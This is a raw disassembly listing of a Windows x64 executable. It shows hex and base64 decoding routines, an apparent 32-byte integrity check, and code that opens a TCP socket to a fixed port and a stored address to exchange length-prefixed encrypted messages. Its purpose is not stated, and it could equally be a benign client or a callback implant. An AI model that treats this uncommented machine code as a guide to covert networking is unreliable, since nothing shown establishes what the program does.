   140002679:	4c 8d 74 24 70       	lea    0x70(%rsp),%r14
   14000267e:	48 8d 7b 40          	lea    0x40(%rbx),%rdi
   140002682:	4c 89 f6             	mov    %r14,%rsi
   140002685:	48 8d ac 24 90 00 00 	lea    0x90(%rsp),%rbp
   14000268c:	00 
   14000268d:	4c 8d 25 2c 1a 01 00 	lea    0x11a2c(%rip),%r12        # 0x1400140c0
   140002694:	0f 1f 40 00          	nopl   0x0(%rax)
   140002698:	48 89 d9             	mov    %rbx,%rcx
   14000269b:	49 89 e8             	mov    %rbp,%r8
   14000269e:	4c 89 e2             	mov    %r12,%rdx
   1400026a1:	e8 4a f6 ff ff       	call   0x140001cf0
   1400026a6:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   1400026ad:	48 83 c3 02          	add    $0x2,%rbx
   1400026b1:	48 83 c6 01          	add    $0x1,%rsi
   1400026b5:	88 46 ff             	mov    %al,-0x1(%rsi)
   1400026b8:	48 39 fb             	cmp    %rdi,%rbx
   1400026bb:	75 db                	jne    0x140002698
   1400026bd:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400026c2:	48 8d 1d b7 1a 01 00 	lea    0x11ab7(%rip),%rbx        # 0x140014180
   1400026c9:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400026ce:	48 89 c6             	mov    %rax,%rsi
   1400026d1:	48 8d 7b 30          	lea    0x30(%rbx),%rdi
   1400026d5:	0f 1f 00             	nopl   (%rax)
   1400026d8:	48 89 d9             	mov    %rbx,%rcx
   1400026db:	49 89 e8             	mov    %rbp,%r8
   1400026de:	4c 89 e2             	mov    %r12,%rdx
   1400026e1:	e8 0a f6 ff ff       	call   0x140001cf0
   1400026e6:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   1400026ed:	48 83 c3 02          	add    $0x2,%rbx
   1400026f1:	48 83 c6 01          	add    $0x1,%rsi
   1400026f5:	88 46 ff             	mov    %al,-0x1(%rsi)
   1400026f8:	48 39 fb             	cmp    %rdi,%rbx
   1400026fb:	75 db                	jne    0x1400026d8
   1400026fd:	45 8d 65 d0          	lea    -0x30(%r13),%r12d
   140002701:	49 63 dd             	movslq %r13d,%rbx
   140002704:	49 8d 77 10          	lea    0x10(%r15),%rsi
   140002708:	48 83 eb 20          	sub    $0x20,%rbx
   14000270c:	48 89 d9             	mov    %rbx,%rcx
   14000270f:	e8 fc 00 01 00       	call   0x140012810
   140002714:	4d 63 c4             	movslq %r12d,%r8
   140002717:	48 89 f2             	mov    %rsi,%rdx
   14000271a:	48 89 c7             	mov    %rax,%rdi
   14000271d:	49 8b 07             	mov    (%r15),%rax
   140002720:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140002724:	48 89 07             	mov    %rax,(%rdi)
   140002727:	49 8b 47 08          	mov    0x8(%r15),%rax
   14000272b:	48 89 47 08          	mov    %rax,0x8(%rdi)
   14000272f:	e8 e4 00 01 00       	call   0x140012818
   140002734:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002739:	45 8d 4d e0          	lea    -0x20(%r13),%r9d
   14000273d:	49 89 f8             	mov    %rdi,%r8
   140002740:	ba 18 00 00 00       	mov    $0x18,%edx
   140002745:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000274a:	e8 91 f7 ff ff       	call   0x140001ee0
   14000274f:	48 89 f9             	mov    %rdi,%rcx
   140002752:	e8 89 00 01 00       	call   0x1400127e0
   140002757:	49 8d 04 1f          	lea    (%r15,%rbx,1),%rax
   14000275b:	31 db                	xor    %ebx,%ebx
   14000275d:	66 0f ef d2          	pxor   %xmm2,%xmm2
   140002761:	66 0f ef e4          	pxor   %xmm4,%xmm4
   140002765:	66 0f ef db          	pxor   %xmm3,%xmm3
   140002769:	f3 0f 6f 04 18       	movdqu (%rax,%rbx,1),%xmm0
   14000276e:	66 0f ef 44 1d 00    	pxor   0x0(%rbp,%rbx,1),%xmm0
   140002774:	66 0f 6f c8          	movdqa %xmm0,%xmm1
   140002778:	48 83 c3 10          	add    $0x10,%rbx
   14000277c:	66 0f 60 cc          	punpcklbw %xmm4,%xmm1
   140002780:	66 0f 6f e9          	movdqa %xmm1,%xmm5
   140002784:	66 0f 68 c4          	punpckhbw %xmm4,%xmm0
   140002788:	66 0f 69 cb          	punpckhwd %xmm3,%xmm1
   14000278c:	66 0f 61 eb          	punpcklwd %xmm3,%xmm5
   140002790:	48 83 fb 20          	cmp    $0x20,%rbx
   140002794:	66 0f eb cd          	por    %xmm5,%xmm1
   140002798:	66 0f 6f e8          	movdqa %xmm0,%xmm5
   14000279c:	66 0f 61 eb          	punpcklwd %xmm3,%xmm5
   1400027a0:	66 0f 69 c3          	punpckhwd %xmm3,%xmm0
   1400027a4:	66 0f eb c5          	por    %xmm5,%xmm0
   1400027a8:	66 0f eb c8          	por    %xmm0,%xmm1
   1400027ac:	66 0f eb d1          	por    %xmm1,%xmm2
   1400027b0:	75 b7                	jne    0x140002769
   1400027b2:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   1400027b6:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1400027bb:	66 0f eb d0          	por    %xmm0,%xmm2
   1400027bf:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   1400027c3:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   1400027c8:	66 0f eb d0          	por    %xmm0,%xmm2
   1400027cc:	66 0f 7e d0          	movd   %xmm2,%eax
   1400027d0:	85 c0                	test   %eax,%eax
   1400027d2:	0f 85 a0 00 00 00    	jne    0x140002878
   1400027d8:	41 83 ed 2f          	sub    $0x2f,%r13d
   1400027dc:	4d 63 ed             	movslq %r13d,%r13
   1400027df:	4c 89 e9             	mov    %r13,%rcx
   1400027e2:	e8 29 00 01 00       	call   0x140012810
   1400027e7:	45 89 e1             	mov    %r12d,%r9d
   1400027ea:	49 89 f0             	mov    %rsi,%r8
   1400027ed:	4c 89 fa             	mov    %r15,%rdx
   1400027f0:	48 89 c5             	mov    %rax,%rbp
   1400027f3:	4c 89 f1             	mov    %r14,%rcx
   1400027f6:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   1400027fd:	00 
   1400027fe:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140002803:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002808:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000280d:	e8 1e fa ff ff       	call   0x140002230
   140002812:	85 c0                	test   %eax,%eax
   140002814:	75 5a                	jne    0x140002870
   140002816:	48 63 44 24 4c       	movslq 0x4c(%rsp),%rax
   14000281b:	48 89 e9             	mov    %rbp,%rcx
   14000281e:	45 31 e4             	xor    %r12d,%r12d
   140002821:	48 89 ef             	mov    %rbp,%rdi
   140002824:	c6 44 05 00 00       	movb   $0x0,0x0(%rbp,%rax,1)
   140002829:	ff 15 d9 9f 01 00    	call   *0x19fd9(%rip)        # 0x14001c808
   14000282f:	4c 89 e9             	mov    %r13,%rcx
   140002832:	49 89 c7             	mov    %rax,%r15
   140002835:	44 89 e0             	mov    %r12d,%eax
   140002838:	f3 aa                	rep stos %al,(%rdi)
   14000283a:	48 89 e9             	mov    %rbp,%rcx
   14000283d:	4c 89 f7             	mov    %r14,%rdi
   140002840:	e8 9b ff 00 00       	call   0x1400127e0
   140002845:	48 89 d9             	mov    %rbx,%rcx
   140002848:	44 89 e0             	mov    %r12d,%eax
   14000284b:	f3 aa                	rep stos %al,(%rdi)
   14000284d:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002852:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140002857:	f3 aa                	rep stos %al,(%rdi)
   140002859:	4c 89 f8             	mov    %r15,%rax
   14000285c:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   140002863:	5b                   	pop    %rbx
   140002864:	5e                   	pop    %rsi
   140002865:	5f                   	pop    %rdi
   140002866:	5d                   	pop    %rbp
   140002867:	41 5c                	pop    %r12
   140002869:	41 5d                	pop    %r13
   14000286b:	41 5e                	pop    %r14
   14000286d:	41 5f                	pop    %r15
   14000286f:	c3                   	ret
   140002870:	48 89 e9             	mov    %rbp,%rcx
   140002873:	e8 68 ff 00 00       	call   0x1400127e0
   140002878:	31 c0                	xor    %eax,%eax
   14000287a:	4c 89 f7             	mov    %r14,%rdi
   14000287d:	48 89 d9             	mov    %rbx,%rcx
   140002880:	f3 aa                	rep stos %al,(%rdi)
   140002882:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002887:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000288c:	f3 aa                	rep stos %al,(%rdi)
   14000288e:	45 31 ff             	xor    %r15d,%r15d
   140002891:	eb c6                	jmp    0x140002859
   140002893:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000289a:	00 00 00 00 
   14000289e:	66 90                	xchg   %ax,%ax
   1400028a0:	41 56                	push   %r14
   1400028a2:	41 54                	push   %r12
   1400028a4:	55                   	push   %rbp
   1400028a5:	57                   	push   %rdi
   1400028a6:	56                   	push   %rsi
   1400028a7:	53                   	push   %rbx
   1400028a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400028ac:	49 89 d6             	mov    %rdx,%r14
   1400028af:	48 89 cd             	mov    %rcx,%rbp
   1400028b2:	e8 99 ff 00 00       	call   0x140012850
   1400028b7:	8d 50 03             	lea    0x3(%rax),%edx
   1400028ba:	85 c0                	test   %eax,%eax
   1400028bc:	89 c6                	mov    %eax,%esi
   1400028be:	0f 49 d0             	cmovns %eax,%edx
   1400028c1:	c1 fa 02             	sar    $0x2,%edx
   1400028c4:	85 c0                	test   %eax,%eax
   1400028c6:	8d 14 52             	lea    (%rdx,%rdx,2),%edx
   1400028c9:	89 d7                	mov    %edx,%edi
   1400028cb:	0f 8e ef 00 00 00    	jle    0x1400029c0
   1400028d1:	4c 63 c0             	movslq %eax,%r8
   1400028d4:	31 c9                	xor    %ecx,%ecx
   1400028d6:	42 80 7c 05 ff 3d    	cmpb   $0x3d,-0x1(%rbp,%r8,1)
   1400028dc:	0f 94 c1             	sete   %cl
   1400028df:	83 f8 01             	cmp    $0x1,%eax
   1400028e2:	74 0c                	je     0x1400028f0
   1400028e4:	42 80 7c 05 fe 3d    	cmpb   $0x3d,-0x2(%rbp,%r8,1)
   1400028ea:	0f 84 c5 00 00 00    	je     0x1400029b5
   1400028f0:	89 d7                	mov    %edx,%edi
   1400028f2:	29 cf                	sub    %ecx,%edi
   1400028f4:	8d 4f 01             	lea    0x1(%rdi),%ecx
   1400028f7:	48 63 c9             	movslq %ecx,%rcx
   1400028fa:	e8 11 ff 00 00       	call   0x140012810
   1400028ff:	49 89 ea             	mov    %rbp,%r10
   140002902:	45 31 c0             	xor    %r8d,%r8d
   140002905:	45 31 db             	xor    %r11d,%r11d
   140002908:	48 8d 2d b1 18 01 00 	lea    0x118b1(%rip),%rbp        # 0x1400141c0
   14000290f:	49 89 c4             	mov    %rax,%r12
   140002912:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002918:	31 c0                	xor    %eax,%eax
   14000291a:	31 d2                	xor    %edx,%edx
   14000291c:	41 8d 0c 00          	lea    (%r8,%rax,1),%ecx
   140002920:	c1 e2 06             	shl    $0x6,%edx
   140002923:	39 ce                	cmp    %ecx,%esi
   140002925:	7e 16                	jle    0x14000293d
   140002927:	41 0f b6 0c 02       	movzbl (%r10,%rax,1),%ecx
   14000292c:	0f b6 4c 0d 00       	movzbl 0x0(%rbp,%rcx,1),%ecx
   140002931:	41 89 c9             	mov    %ecx,%r9d
   140002934:	09 d1                	or     %edx,%ecx
   140002936:	41 80 f9 40          	cmp    $0x40,%r9b
   14000293a:	0f 45 d1             	cmovne %ecx,%edx
   14000293d:	48 83 c0 01          	add    $0x1,%rax
   140002941:	48 83 f8 04          	cmp    $0x4,%rax
   140002945:	75 d5                	jne    0x14000291c
   140002947:	44 39 df             	cmp    %r11d,%edi
   14000294a:	7e 32                	jle    0x14000297e
   14000294c:	41 8d 43 01          	lea    0x1(%r11),%eax
   140002950:	41 89 d1             	mov    %edx,%r9d
   140002953:	49 63 cb             	movslq %r11d,%rcx
   140002956:	41 c1 e9 10          	shr    $0x10,%r9d
   14000295a:	39 c7                	cmp    %eax,%edi
   14000295c:	45 88 0c 0c          	mov    %r9b,(%r12,%rcx,1)
   140002960:	7e 4e                	jle    0x1400029b0
   140002962:	41 8d 4b 02          	lea    0x2(%r11),%ecx
   140002966:	48 98                	cltq
   140002968:	0f b6 de             	movzbl %dh,%ebx
   14000296b:	39 cf                	cmp    %ecx,%edi
   14000296d:	41 88 1c 04          	mov    %bl,(%r12,%rax,1)
   140002971:	7e 5d                	jle    0x1400029d0
   140002973:	48 63 c9             	movslq %ecx,%rcx
   140002976:	41 83 c3 03          	add    $0x3,%r11d
   14000297a:	41 88 14 0c          	mov    %dl,(%r12,%rcx,1)
   14000297e:	41 83 c0 04          	add    $0x4,%r8d
   140002982:	49 83 c2 04          	add    $0x4,%r10
   140002986:	44 39 c6             	cmp    %r8d,%esi
   140002989:	7f 8d                	jg     0x140002918
   14000298b:	41 89 3e             	mov    %edi,(%r14)
   14000298e:	4c 89 e0             	mov    %r12,%rax
   140002991:	48 63 ff             	movslq %edi,%rdi
   140002994:	41 c6 04 3c 00       	movb   $0x0,(%r12,%rdi,1)
   140002999:	48 83 c4 28          	add    $0x28,%rsp
   14000299d:	5b                   	pop    %rbx
   14000299e:	5e                   	pop    %rsi
   14000299f:	5f                   	pop    %rdi
   1400029a0:	5d                   	pop    %rbp
   1400029a1:	41 5c                	pop    %r12
   1400029a3:	41 5e                	pop    %r14
   1400029a5:	c3                   	ret
   1400029a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400029ad:	00 00 00 
   1400029b0:	41 89 c3             	mov    %eax,%r11d
   1400029b3:	eb c9                	jmp    0x14000297e
   1400029b5:	83 c1 01             	add    $0x1,%ecx
   1400029b8:	e9 33 ff ff ff       	jmp    0x1400028f0
   1400029bd:	0f 1f 00             	nopl   (%rax)
   1400029c0:	8d 4a 01             	lea    0x1(%rdx),%ecx
   1400029c3:	48 63 c9             	movslq %ecx,%rcx
   1400029c6:	e8 45 fe 00 00       	call   0x140012810
   1400029cb:	49 89 c4             	mov    %rax,%r12
   1400029ce:	eb bb                	jmp    0x14000298b
   1400029d0:	41 89 cb             	mov    %ecx,%r11d
   1400029d3:	eb a9                	jmp    0x14000297e
   1400029d5:	90                   	nop
   1400029d6:	90                   	nop
   1400029d7:	90                   	nop
   1400029d8:	90                   	nop
   1400029d9:	90                   	nop
   1400029da:	90                   	nop
   1400029db:	90                   	nop
   1400029dc:	90                   	nop
   1400029dd:	90                   	nop
   1400029de:	90                   	nop
   1400029df:	90                   	nop
   1400029e0:	55                   	push   %rbp
   1400029e1:	57                   	push   %rdi
   1400029e2:	56                   	push   %rsi
   1400029e3:	53                   	push   %rbx
   1400029e4:	48 81 ec 08 02 00 00 	sub    $0x208,%rsp
   1400029eb:	8b 15 3f 86 01 00    	mov    0x1863f(%rip),%edx        # 0x14001b030
   1400029f1:	85 d2                	test   %edx,%edx
   1400029f3:	48 89 cb             	mov    %rcx,%rbx
   1400029f6:	0f 84 1c 01 00 00    	je     0x140002b18
   1400029fc:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002a01:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140002a07:	ba 01 00 00 00       	mov    $0x1,%edx
   140002a0c:	ff 15 9e 9f 01 00    	call   *0x19f9e(%rip)        # 0x14001c9b0
   140002a12:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002a16:	48 89 c1             	mov    %rax,%rcx
   140002a19:	48 89 03             	mov    %rax,(%rbx)
   140002a1c:	0f 84 b7 01 00 00    	je     0x140002bd9
   140002a22:	48 8d 7c 24 38       	lea    0x38(%rsp),%rdi
   140002a27:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   140002a2d:	48 8b 35 6c 9f 01 00 	mov    0x19f6c(%rip),%rsi        # 0x14001c9a0
   140002a34:	ba ff ff 00 00       	mov    $0xffff,%edx
   140002a39:	49 89 f9             	mov    %rdi,%r9
   140002a3c:	c7 44 24 38 10 27 00 	movl   $0x2710,0x38(%rsp)
   140002a43:	00 
   140002a44:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002a4b:	00 
   140002a4c:	ff d6                	call   *%rsi
   140002a4e:	48 8b 0b             	mov    (%rbx),%rcx
   140002a51:	49 89 f9             	mov    %rdi,%r9
   140002a54:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   140002a5a:	ba ff ff 00 00       	mov    $0xffff,%edx
   140002a5f:	c7 44 24 38 30 75 00 	movl   $0x7530,0x38(%rsp)
   140002a66:	00 
   140002a67:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002a6e:	00 
   140002a6f:	ff d6                	call   *%rsi
   140002a71:	48 8b 0b             	mov    (%rbx),%rcx
   140002a74:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   140002a79:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002a7f:	ba 06 00 00 00       	mov    $0x6,%edx
   140002a84:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%rsp)
   140002a8b:	00 
   140002a8c:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002a93:	00 
   140002a94:	ff d6                	call   *%rsi
   140002a96:	b8 02 00 00 00       	mov    $0x2,%eax
   140002a9b:	b9 08 26 00 00       	mov    $0x2608,%ecx
   140002aa0:	48 c7 44 24 52 00 00 	movq   $0x0,0x52(%rsp)
   140002aa7:	00 00 
   140002aa9:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   140002aae:	48 8d 35 0b 18 01 00 	lea    0x1180b(%rip),%rsi        # 0x1400142c0
   140002ab5:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140002abc:	00 00 
   140002abe:	ff 15 bc 9e 01 00    	call   *0x19ebc(%rip)        # 0x14001c980
   140002ac4:	4c 8d 44 24 54       	lea    0x54(%rsp),%r8
   140002ac9:	48 89 f2             	mov    %rsi,%rdx
   140002acc:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002ad1:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   140002ad6:	ff 15 ac 9e 01 00    	call   *0x19eac(%rip)        # 0x14001c988
   140002adc:	85 c0                	test   %eax,%eax
   140002ade:	7e 60                	jle    0x140002b40
   140002ae0:	48 8b 0b             	mov    (%rbx),%rcx
   140002ae3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002ae8:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140002aee:	ff 15 74 9e 01 00    	call   *0x19e74(%rip)        # 0x14001c968
   140002af4:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002af7:	0f 84 e6 00 00 00    	je     0x140002be3
   140002afd:	c7 43 08 01 00 00 00 	movl   $0x1,0x8(%rbx)
   140002b04:	31 c0                	xor    %eax,%eax
   140002b06:	48 81 c4 08 02 00 00 	add    $0x208,%rsp
   140002b0d:	5b                   	pop    %rbx
   140002b0e:	5e                   	pop    %rsi
   140002b0f:	5f                   	pop    %rdi
   140002b10:	5d                   	pop    %rbp
   140002b11:	c3                   	ret
   140002b12:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002b18:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002b1d:	b9 02 02 00 00       	mov    $0x202,%ecx
   140002b22:	ff 15 30 9e 01 00    	call   *0x19e30(%rip)        # 0x14001c958
   140002b28:	85 c0                	test   %eax,%eax
   140002b2a:	0f 85 a9 00 00 00    	jne    0x140002bd9
   140002b30:	c7 05 f6 84 01 00 01 	movl   $0x1,0x184f6(%rip)        # 0x14001b030
   140002b37:	00 00 00 
   140002b3a:	e9 bd fe ff ff       	jmp    0x1400029fc
   140002b3f:	90                   	nop
   140002b40:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   140002b45:	31 c0                	xor    %eax,%eax
   140002b47:	b9 06 00 00 00       	mov    $0x6,%ecx
   140002b4c:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140002b53:	00 00 
   140002b55:	48 89 ef             	mov    %rbp,%rdi
   140002b58:	41 b9 08 26 00 00    	mov    $0x2608,%r9d
   140002b5e:	ba 08 00 00 00       	mov    $0x8,%edx
   140002b63:	f3 48 ab             	rep stos %rax,(%rdi)
   140002b66:	48 8b 05 6b 17 01 00 	mov    0x1176b(%rip),%rax        # 0x1400142d8
   140002b6d:	48 8d 7c 24 48       	lea    0x48(%rsp),%rdi
   140002b72:	4c 8d 05 55 17 01 00 	lea    0x11755(%rip),%r8        # 0x1400142ce
   140002b79:	48 89 f9             	mov    %rdi,%rcx
   140002b7c:	48 89 44 24 64       	mov    %rax,0x64(%rsp)
   140002b81:	ff 15 79 9c 01 00    	call   *0x19c79(%rip)        # 0x14001c800
   140002b87:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140002b8c:	49 89 e8             	mov    %rbp,%r8
   140002b8f:	48 89 fa             	mov    %rdi,%rdx
   140002b92:	48 89 f1             	mov    %rsi,%rcx
   140002b95:	ff 15 dd 9d 01 00    	call   *0x19ddd(%rip)        # 0x14001c978
   140002b9b:	85 c0                	test   %eax,%eax
   140002b9d:	75 2a                	jne    0x140002bc9
   140002b9f:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002ba4:	48 85 c9             	test   %rcx,%rcx
   140002ba7:	74 20                	je     0x140002bc9
   140002ba9:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002bad:	48 8b 10             	mov    (%rax),%rdx
   140002bb0:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   140002bb5:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002bb9:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002bbe:	ff 15 ac 9d 01 00    	call   *0x19dac(%rip)        # 0x14001c970
   140002bc4:	e9 17 ff ff ff       	jmp    0x140002ae0
   140002bc9:	48 8b 0b             	mov    (%rbx),%rcx
   140002bcc:	ff 15 8e 9d 01 00    	call   *0x19d8e(%rip)        # 0x14001c960
   140002bd2:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140002bd9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002bde:	e9 23 ff ff ff       	jmp    0x140002b06
   140002be3:	48 8b 0b             	mov    (%rbx),%rcx
   140002be6:	ff 15 74 9d 01 00    	call   *0x19d74(%rip)        # 0x14001c960
   140002bec:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140002bf3:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%rbx)
   140002bfa:	eb dd                	jmp    0x140002bd9
   140002bfc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002c00:	53                   	push   %rbx
   140002c01:	48 83 ec 20          	sub    $0x20,%rsp
   140002c05:	48 89 cb             	mov    %rcx,%rbx
   140002c08:	48 8b 09             	mov    (%rcx),%rcx
   140002c0b:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140002c0f:	74 1b                	je     0x140002c2c
   140002c11:	ba 02 00 00 00       	mov    $0x2,%edx
   140002c16:	ff 15 8c 9d 01 00    	call   *0x19d8c(%rip)        # 0x14001c9a8
   140002c1c:	48 8b 0b             	mov    (%rbx),%rcx
   140002c1f:	ff 15 3b 9d 01 00    	call   *0x19d3b(%rip)        # 0x14001c960
   140002c25:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140002c2c:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%rbx)
   140002c33:	48 83 c4 20          	add    $0x20,%rsp
   140002c37:	5b                   	pop    %rbx
   140002c38:	c3                   	ret
   140002c39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002c40:	41 55                	push   %r13
   140002c42:	41 54                	push   %r12
   140002c44:	55                   	push   %rbp
   140002c45:	57                   	push   %rdi
   140002c46:	56                   	push   %rsi
   140002c47:	53                   	push   %rbx
   140002c48:	48 83 ec 38          	sub    $0x38,%rsp
   140002c4c:	48 89 cb             	mov    %rcx,%rbx
   140002c4f:	48 89 d1             	mov    %rdx,%rcx
   140002c52:	8b 43 08             	mov    0x8(%rbx),%eax
   140002c55:	85 c0                	test   %eax,%eax
   140002c57:	0f 84 aa 00 00 00    	je     0x140002d07
   140002c5d:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140002c61:	0f 84 a0 00 00 00    	je     0x140002d07
   140002c67:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140002c6c:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
   140002c73:	00 
   140002c74:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140002c7b:	00 00 
   140002c7d:	4c 8d 44 24 24       	lea    0x24(%rsp),%r8
   140002c82:	e8 89 f7 ff ff       	call   0x140002410
   140002c87:	85 c0                	test   %eax,%eax
   140002c89:	41 89 c5             	mov    %eax,%r13d
   140002c8c:	75 79                	jne    0x140002d07
   140002c8e:	8b 74 24 24          	mov    0x24(%rsp),%esi
   140002c92:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140002c97:	48 8b 2b             	mov    (%rbx),%rbp
   140002c9a:	85 f6                	test   %esi,%esi
   140002c9c:	7e 40                	jle    0x140002cde
   140002c9e:	4c 8b 25 f3 9c 01 00 	mov    0x19cf3(%rip),%r12        # 0x14001c998
   140002ca5:	31 db                	xor    %ebx,%ebx
   140002ca7:	eb 0d                	jmp    0x140002cb6
   140002ca9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002cb0:	01 c3                	add    %eax,%ebx
   140002cb2:	39 de                	cmp    %ebx,%esi
   140002cb4:	7e 4a                	jle    0x140002d00
   140002cb6:	48 63 d3             	movslq %ebx,%rdx
   140002cb9:	41 89 f0             	mov    %esi,%r8d
   140002cbc:	45 31 c9             	xor    %r9d,%r9d
   140002cbf:	48 01 fa             	add    %rdi,%rdx
   140002cc2:	41 29 d8             	sub    %ebx,%r8d
   140002cc5:	48 89 e9             	mov    %rbp,%rcx
   140002cc8:	41 ff d4             	call   *%r12
   140002ccb:	8d 50 01             	lea    0x1(%rax),%edx
   140002cce:	83 fa 01             	cmp    $0x1,%edx
   140002cd1:	77 dd                	ja     0x140002cb0
   140002cd3:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140002cd8:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140002cde:	48 89 f9             	mov    %rdi,%rcx
   140002ce1:	e8 fa fa 00 00       	call   0x1400127e0
   140002ce6:	44 89 e8             	mov    %r13d,%eax
   140002ce9:	48 83 c4 38          	add    $0x38,%rsp
   140002ced:	5b                   	pop    %rbx
   140002cee:	5e                   	pop    %rsi
   140002cef:	5f                   	pop    %rdi
   140002cf0:	5d                   	pop    %rbp
   140002cf1:	41 5c                	pop    %r12
   140002cf3:	41 5d                	pop    %r13
   140002cf5:	c3                   	ret
   140002cf6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002cfd:	00 00 00 
   140002d00:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140002d05:	eb d7                	jmp    0x140002cde
   140002d07:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140002d0d:	eb d7                	jmp    0x140002ce6
   140002d0f:	90                   	nop
   140002d10:	41 55                	push   %r13
   140002d12:	41 54                	push   %r12
   140002d14:	55                   	push   %rbp
   140002d15:	57                   	push   %rdi
   140002d16:	56                   	push   %rsi
   140002d17:	53                   	push   %rbx
   140002d18:	48 83 ec 48          	sub    $0x48,%rsp
   140002d1c:	8b 41 08             	mov    0x8(%rcx),%eax
   140002d1f:	85 c0                	test   %eax,%eax
   140002d21:	49 89 cd             	mov    %rcx,%r13
   140002d24:	74 41                	je     0x140002d67
   140002d26:	48 8b 39             	mov    (%rcx),%rdi
   140002d29:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140002d2d:	74 38                	je     0x140002d67
   140002d2f:	48 8b 35 5a 9c 01 00 	mov    0x19c5a(%rip),%rsi        # 0x14001c990
   140002d36:	31 db                	xor    %ebx,%ebx
   140002d38:	bd 04 00 00 00       	mov    $0x4,%ebp
   140002d3d:	4c 8d 64 24 3c       	lea    0x3c(%rsp),%r12
   140002d42:	eb 0b                	jmp    0x140002d4f
   140002d44:	0f 1f 40 00          	nopl   0x0(%rax)
   140002d48:	01 c3                	add    %eax,%ebx
   140002d4a:	83 fb 03             	cmp    $0x3,%ebx
   140002d4d:	7f 31                	jg     0x140002d80
   140002d4f:	48 63 d3             	movslq %ebx,%rdx
   140002d52:	41 89 e8             	mov    %ebp,%r8d
   140002d55:	45 31 c9             	xor    %r9d,%r9d
   140002d58:	4c 01 e2             	add    %r12,%rdx
   140002d5b:	41 29 d8             	sub    %ebx,%r8d
   140002d5e:	48 89 f9             	mov    %rdi,%rcx
   140002d61:	ff d6                	call   *%rsi
   140002d63:	85 c0                	test   %eax,%eax
   140002d65:	7f e1                	jg     0x140002d48
   140002d67:	31 c0                	xor    %eax,%eax
   140002d69:	48 83 c4 48          	add    $0x48,%rsp
   140002d6d:	5b                   	pop    %rbx
   140002d6e:	5e                   	pop    %rsi
   140002d6f:	5f                   	pop    %rdi
   140002d70:	5d                   	pop    %rbp
   140002d71:	41 5c                	pop    %r12
   140002d73:	41 5d                	pop    %r13
   140002d75:	c3                   	ret
